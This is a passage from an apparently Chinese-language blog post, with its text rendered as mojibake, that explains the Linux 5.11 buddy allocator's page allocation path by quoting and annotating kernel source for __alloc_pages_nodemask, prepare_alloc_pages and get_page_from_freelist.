è¿”å›ä½œä¸º entry çš„ node çš„ index</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯å…¶ä¸ºä¸€ä¸ª  <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“æ•°ç»„ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼ŒåŒ…å«äº†ä¸€ä¸ª zone çš„æŒ‡é’ˆä»¥åŠä¸€ä¸ª indexï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è¯¥ç»“æ„åŒ…å«äº† zonelist ä¸­ä¸€ä¸ª zone çš„ä¿¡æ¯ã€‚ </span></span><br><span class="line"><span class="comment"> * å…¶è¢«å‚¨å­˜åœ¨è¿™é‡Œä»¥é¢„é˜²å¯¹å¤§ç»“æ„ä½“çš„è§£å¼•ç”¨ä¸å¯¹è¡¨çš„æŸ¥è¯¢ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span><span class="comment">/* æŒ‡å‘å®é™…ä¸Šçš„ zone çš„æŒ‡é’ˆ */</span></span><br><span class="line"><span class="type">int</span> zone_idx;<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>è¯¥æˆå‘˜ä¸ºä¸€ä¸ª <code>zoneref</code> ç±»å‹çš„ç»“æ„ä½“ï¼Œè¡¨ç¤º<strong>ä¼˜å…ˆç”¨æ¥è¿›è¡Œåˆ†é…çš„ zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>å¸ƒå°”å€¼ï¼Œè¡¨ç¤º<strong>æ­¤æ¬¡åˆ†é…æ˜¯å¦å¯èƒ½äº§ç”Ÿè„é¡µ</strong>ï¼ˆéœ€è¦è¿›è¡Œå†™å›ï¼‰ï¼Œé€šå¸¸åˆ†é…éœ€è¦å†™å…¥çš„é¡µä¼šå‡ºç°</p><h2 id="ä¸‰ã€-alloc-pages-nodemask-ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å›-page-ç»“æ„ä½“"><a href="#ä¸‰ã€-alloc-pages-nodemask-ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å›-page-ç»“æ„ä½“" class="headerlink" title="ä¸‰ã€__alloc_pages_nodemask()ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å› page ç»“æ„ä½“"></a>ä¸‰ã€__alloc_pages_nodemask()ï¼šåˆ†é…é¡µé¢çš„ã€Œæ ¸å¿ƒå‡½æ•°ã€ï¼Œè¿”å› page ç»“æ„ä½“</h2><p>è¯¥å‡½æ•°æ˜¯ buddy system ä¸­ç”¨ä»¥è¿›è¡Œé¡µé¢åˆ†é…çš„<strong>æ ¸å¿ƒå‡½æ•°</strong>ï¼Œæ‰€æœ‰çš„é¡µé¢åˆ†é… API éƒ½æ˜¯åŸºäºè¯¥å‡½æ•°çš„å°è£…ï¼Œå…¶éœ€è¦ä¼ å…¥çš„å››ä¸ªå‚æ•°ä¸ºï¼š</p><ul><li><code>gfp_mask</code>ï¼šåˆ†é…è¡Œä¸ºå‚æ•°ï¼ˆå¯ä»¥å‚è§ <a href="https://blog.csdn.net/choumin/article/details/109603011">è¿™é‡Œ</a>ï¼‰</li><li><code>order</code>ï¼šåˆ†é…çš„è¿ç»­ç‰©ç†é¡µæ¡†çš„é˜¶</li><li><code>preferred_nid</code> é€‰å–çš„èŠ‚ç‚¹çš„ id</li><li><code>nodemask</code>ï¼š</li></ul><p>è¿”å›å€¼ä¸ºåˆ†é…çš„<strong>è¿ç»­ç‰©ç†é¡µ</strong>ä¸­çš„ç¬¬ä¸€å¼ ç‰©ç†é¡µçš„ <code>page</code> ç»“æ„ä½“</p><blockquote><p>å¦‚æœä½ å·²ç»ä¸è®°å¾— page ç»“æ„ä½“ä¸ç‰©ç†é¡µçš„é¡µæ¡†å·é—´çš„è½¬æ¢å…¬å¼äº†ï¼Œå¯ä»¥å›å»çœ‹<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">ä¸Šä¸€ç¯‡æ–‡ç« </a></p><p>å½“ç„¶ï¼Œç¬”è€…æ¯”è¾ƒå¥½å¿ƒï¼ˆç¬‘ï¼‰ï¼Œè¿™é‡Œç›´æ¥ç»™å‡ºè®¡ç®—å…¬å¼ï¼Œ<code>mem_section</code> ç»“æ„ä½“ä¸­çš„ <code>section_mem_map</code> æˆå‘˜å­˜å‚¨äº†å…¶èµ·å§‹åœ°å€å‡æ‰å…¶èµ·å§‹åœ°å€å¯¹åº”çš„ç‰©ç†é¡µæ¡†çš„é¡µæ¡†å·çš„å·®å€¼ï¼Œè¯¥æˆå‘˜ä¸ page ç»“æ„ä½“é—´åš<strong>æŒ‡é’ˆå·®å€¼è¿ç®—</strong>ä¾¿èƒ½è·å¾— page ç»“æ„ä½“å¯¹åº”çš„ç‰©ç†é¡µæ¡†å·ï¼š<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p></blockquote><p>è¿™æ˜¯ä¸€å¼ _Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="ä»çŸ¥ä¹å·çš„.png"></p><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_nodemask</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>, <span class="title">int</span> <span class="title">preferred_nid</span>,</span></span><br><span class="line"><span class="class"><span class="title">nodemask_t</span> *<span class="title">nodemask</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> alloc_flags = ALLOC_WMARK_LOW;</span><br><span class="line"><span class="type">gfp_t</span> alloc_mask; <span class="comment">/* å®é™…ç”¨äºåˆ†é…çš„ gfp_t ï¼Œè¿™æ˜¯ä¸€ä¸ªintç±»å‹çš„æ•´å‹*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> <span class="title">ac</span> =</span> &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æˆ‘ä»¬å‡å®š order çš„å€¼åœ¨ä¸€äº›åœ°æ–¹æ˜¯æ­£å¸¸çš„ï¼Œ</span></span><br><span class="line"><span class="comment"> * å› æ­¤è‹¥è¯·æ±‚è¶…å‡ºèŒƒå›´åˆ™æå‰é€€å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;</span><br><span class="line">WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gfp_mask &amp;= gfp_allowed_mask;</span><br><span class="line">alloc_mask = gfp_mask;</span><br><span class="line"><span class="keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ç›´åˆ°æ‰€æœ‰çš„ local zone éƒ½è¢«è€ƒè™‘ä¹‹å‰ï¼Œ</span></span><br><span class="line"><span class="comment"> * ç¦æ­¢ä» falling back åˆ°å†…å­˜ç¢ç‰‡ç§ç±»çš„ç¬¬ä¸€æ¬¡ä¼ é€’</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ç¬¬ä¸€æ¬¡åˆ†é…å°è¯• */</span></span><br><span class="line">page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);</span><br><span class="line"><span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * åº”ç”¨ä½œç”¨åŸŸåˆ†é…çº¦æŸ è¿™ä¸»è¦ä¸ GFP_NOFS æœ‰å…³ã€‚</span></span><br><span class="line"><span class="comment"> * GFP_NOIO å¿…é¡»ä»ä¸€ä¸ªç‰¹å®šçš„ç”± memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span></span><br><span class="line"><span class="comment"> * æ‰€æ ‡è®°çš„ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰çš„åˆ†é…è¯·æ±‚ä¸­ç»§æ‰¿</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_mask = current_gfp_context(gfp_mask);</span><br><span class="line">ac.spread_dirty_pages = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ¢å¤æœ€åˆçš„ nodemask ï¼ˆå…¶å¯èƒ½è¢«æ›¿æ¢ä¸º &amp;cpuset_current_mems_allowed</span></span><br><span class="line"><span class="comment"> * ä»¥ä¼˜åŒ–å¿«é€Ÿï¼ˆåˆ†é…ï¼‰è·¯å¾„çš„å°è¯•ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac.nodemask = nodemask;</span><br><span class="line"></span><br><span class="line">page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;</span><br><span class="line">    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="number">0</span>)) &#123;</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__alloc_pages_nodemask);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°çš„å…·ä½“æ­¥éª¤ä¸»è¦åˆ†ä¸ºä¸‰æ­¥ï¼š</p><ul><li>æ£€æŸ¥å‚æ•°åˆæ³•æ€§ï¼Œå¹¶åšåˆ†é…å‰å‡†å¤‡å·¥ä½œ</li><li>è¿›è¡Œ<strong>å¿«é€Ÿåˆ†é…</strong>ï¼ŒæˆåŠŸåˆ™ç›´æ¥è¿”å›ç»“æœ</li><li>è‹¥å¿«é€Ÿåˆ†é…å¤±è´¥ï¼Œåˆ™è¿›è¡Œ<strong>æ…¢é€Ÿåˆ†é…</strong></li></ul><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ·±å…¥å¿«é€Ÿåˆ†é…ä¸æ…¢é€Ÿåˆ†é…çš„å†…éƒ¨ç»†èŠ‚</p><h3 id="I-prepare-alloc-pages-ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ"><a href="#I-prepare-alloc-pages-ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ" class="headerlink" title="I. prepare_alloc_pages()ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ"></a>I. prepare_alloc_pages()ï¼šåˆ†é…å‰çš„å‡†å¤‡å·¥ä½œ</h3><p>è¿™ä¸ªå‡½æ•°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯åšåˆ†é…å‰çš„ä¸€äº›å‡†å¤‡çš„å·¥ä½œï¼ŒåŒ…æ‹¬åˆå§‹åŒ– <code>alloc_context</code> ç»“æ„ä½“ã€è·å– zone æ•°ç»„ç­‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">prepare_alloc_pages</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params"><span class="type">int</span> preferred_nid, <span class="type">nodemask_t</span> *nodemask,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> alloc_context *ac, <span class="type">gfp_t</span> *alloc_mask,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> *alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);</span><br><span class="line">ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="comment">// è·å– zonelist</span></span><br><span class="line">ac-&gt;nodemask = nodemask;</span><br><span class="line">ac-&gt;migratetype = gfp_migratetype(gfp_mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è‹¥å¼€å¯äº† cpusetï¼ˆé™åˆ¶æŸä¸€ç»„è¿›ç¨‹åªè¿è¡Œåœ¨æŸäº›cpuå’Œå†…å­˜èŠ‚ç‚¹ä¸Šï¼‰ï¼Œåˆ™è®¾ç½®å¯¹åº”çš„æ ‡å¿—ä½ã€‚</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled()) &#123;</span><br><span class="line">*alloc_mask |= __GFP_HARDWALL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * è‹¥æˆ‘ä»¬åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡ä¸­, åˆ™è¿™ä¸å½“å‰è¿›ç¨‹ä¸Šä¸‹æ–‡æ— å…³ã€‚</span></span><br><span class="line"><span class="comment"> * è¿™æ„å‘³ç€ä»»ä¸€ node éƒ½æ˜¯ ok çš„.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)</span><br><span class="line">ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*alloc_flags |= ALLOC_CPUSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs_reclaim_acquire(gfp_mask);</span><br><span class="line">fs_reclaim_release(gfp_mask);</span><br><span class="line"></span><br><span class="line">might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_fail_alloc_page(gfp_mask, order))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dirty zone çš„å¹³è¡¡ä»…åœ¨ fast path ä¸­å®Œæˆ */</span></span><br><span class="line">ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * preferred zone è¢«ç”¨äºè¿›è¡Œæ•°æ®ç»Ÿè®¡ï¼Œ ä½†éå¸¸é‡è¦çš„æ˜¯å…¶é¡µè¢«ç”¨ä½œ</span></span><br><span class="line"><span class="comment"> * zonelist è¿­ä»£å™¨çš„èµ·å§‹ç‚¹. å¯¹äºå¿½ç•¥å†…å­˜ç­–ç•¥çš„åˆ†é…ï¼Œå…¶å¯èƒ½ä¼šè¢«é‡ç½®ã€‚</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆè°ƒç”¨ <code>node_zonelist()</code> ä» <code>preferred_nid</code> å‚æ•°æ‰€æŒ‡å®šçš„ node ä¸­è·å–ä¸€ä¸ª zonelistï¼Œå…¶å®å°±æ˜¯å– <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>è¿›è¡Œ cpuset ç›¸å…³åˆ¤æ–­ä¸æ ‡å¿—ä½è®¾ç½®ï¼Œè‹¥æ˜¯åœ¨ä¸­æ–­ä¸Šä¸‹æ–‡åˆ™ç›´æ¥å°† nodemask è®¾ä¸º <code>cpuset_current_mems_allowed</code></li><li>æœ€åè°ƒç”¨ <code>first_zones_zonelist()</code> è®¾ç½® preferred zoneï¼Œå¤§æ¦‚æ˜¯åœ¨ zonelist ä¸­â†’nodemask æ‰€åŒ…å«çš„ zone ä¸­â†’ <code>highest_zoneidx</code> ä»¥ä¸‹çš„ç¬¬ä¸€ä¸ª zone</li></ul><blockquote><p>åæ­£æºç æ³¨é‡Šæ˜¯è¿™ä¹ˆå†™çš„hhh</p></blockquote><h3 id="II-get-page-from-freelist-ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰"><a href="#II-get-page-from-freelist-ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰" class="headerlink" title="II. get_page_from_freelist()ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰"></a>II. get_page_from_freelist()ï¼šå¿«é€Ÿåˆ†é…è·¯å¾„ï¼ˆæ ¸å¿ƒåˆ†é…å‡½æ•°ï¼‰</h3><p>è¯¥å‡½æ•°å®šä¹‰äº <code>/mm/page_alloc.c</code> ä¸­ï¼Œä¸»è¦æ˜¯éå†åˆ†é…ä¸Šä¸‹æ–‡å¯¹åº”çš„ zonelist ä¸­çš„ zone è¿›è¡Œå†…å­˜åˆ†é…ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * get_page_from_freelist éå† zonelist å°è¯•åˆ†é…é¡µé¢</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *</span><br><span class="line"><span class="title function_">get_page_from_freelist</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order, <span class="type">int</span> alloc_flags,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="keyword">struct</span> alloc_context *ac)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">last_pgdat_dirty_limit</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">bool</span> no_fallback;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * æ‰«æ zonelist, å¯»æ‰¾æœ‰ç€è¶³å¤Ÿç©ºé—²é¡µé¢çš„ zone.</span></span><br><span class="line"><span class="comment"> * å‚è§ __cpuset_node_allowed() çš„æ³¨é‡Šï¼ˆkernel/cpuset.cï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="comment">// é¿å…å†…å­˜ç¢ç‰‡çš„flag</span></span><br><span class="line">z = ac-&gt;preferred_zoneref; <span class="comment">// å…ˆå°è¯•ä» preferred zone ä¸­åˆ†é…</span></span><br><span class="line">    <span class="comment">// è¿™æ˜¯ä¸€ä¸ªå°è£…å®ï¼Œè¡¨ç¤ºä» z å¼€å§‹éå† zonelist ä¸­çš„ zoneref æ•°ç»„ï¼Œ</span></span><br><span class="line">    <span class="comment">// å…¶æ ¸å¿ƒæ˜¯å•æ¬¡è¿­ä»£è°ƒç”¨ next_zones_zonelist()ï¼Œè¯¥å‡½æ•°è¿”å›:</span></span><br><span class="line">    <span class="comment">// åœ¨ nodemask çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„</span></span><br><span class="line">    <span class="comment">// ã€ä½äºæˆ–ä½äºã€‘highest_zoneidx çš„ä¸‹ä¸€ä¸ª zone</span></span><br><span class="line">for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,</span><br><span class="line">ac-&gt;nodemask) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mark;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å¼€å¯äº† cpuset ä¸” flag ä¸­æœ‰ ALLOC_CPUSET æ ‡å¿—ä½ï¼Œ</span></span><br><span class="line">        <span class="comment">// ä½†æ˜¯ cpuset ä¸­ä¸å…è®¸ä»¥è¯¥ gfp_mask åœ¨è¯¥ zone ä¸­åˆ†é…ï¼Œ</span></span><br><span class="line">        <span class="comment">// è¿›è¡Œä¸‹ä¸€æ¬¡è¿­ä»£</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled() &amp;&amp;</span><br><span class="line">(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;</span><br><span class="line">!__cpuset_zone_allowed(zone, gfp_mask))</span><br><span class="line"><span 